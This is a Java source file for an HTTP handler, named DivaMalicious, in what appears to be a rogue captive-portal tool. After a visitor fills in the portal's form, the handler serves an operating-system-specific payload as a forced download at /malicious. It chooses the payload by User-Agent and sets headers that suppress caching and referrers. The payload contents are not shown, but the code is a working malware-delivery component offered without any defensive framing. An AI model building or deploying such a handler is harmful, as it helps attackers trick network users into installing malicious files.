package com.diva.diva;

import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;
import java.io.IOException;

public class DivaMalicious implements HttpHandler {
    private final PortalCautivo portal;

    public DivaMalicious(PortalCautivo portal) {
        this.portal = portal;
    }

    @Override
    public void handle(HttpExchange ex) throws IOException {
        try {
            String ruta = ex.getRequestURI().getPath();
            if (!ruta.equals("/malicious")) {
                PortalCautivo.responder(ex, 404, PaginaPortal.mensaje("Página no encontrada."));
                return;
            }
            if (!"GET".equals(ex.getRequestMethod())) {
                ex.getResponseHeaders().set("Allow", "GET");
                PortalCautivo.responder(ex, 405, PaginaPortal.mensaje("Método no permitido."));
                return;
            }

            PortalCautivo.Sesion s = portal.obtenerSesion(ex);
            if (s == null || s.informe == null) {
                PortalCautivo.responder(ex, 403, PaginaPortal.mensaje("Primero completa el formulario."));
                return;
            }

            String ua = ex.getRequestHeaders().getFirst("User-Agent");
            Payloads.PayloadData payload = Payloads.obtenerPayloadPorOS(ua);

            ex.getResponseHeaders().set("Content-Type", payload.mimeType());
            ex.getResponseHeaders().set("Content-Disposition", "attachment; filename=\"" + payload.filename() + "\"");
            ex.getResponseHeaders().set("Content-Length", String.valueOf(payload.content().length));
            ex.getResponseHeaders().set("Cache-Control", "no-store, no-cache, must-revalidate, max-age=0");
            ex.getResponseHeaders().set("Pragma", "no-cache");
            ex.getResponseHeaders().set("X-Content-Type-Options", "nosniff");
            ex.getResponseHeaders().set("Referrer-Policy", "no-referrer");

            ex.sendResponseHeaders(200, payload.content().length);
            try (var out = ex.getResponseBody()) {
                out.write(payload.content());
            }

        } finally {
            ex.close();
        }
    }
}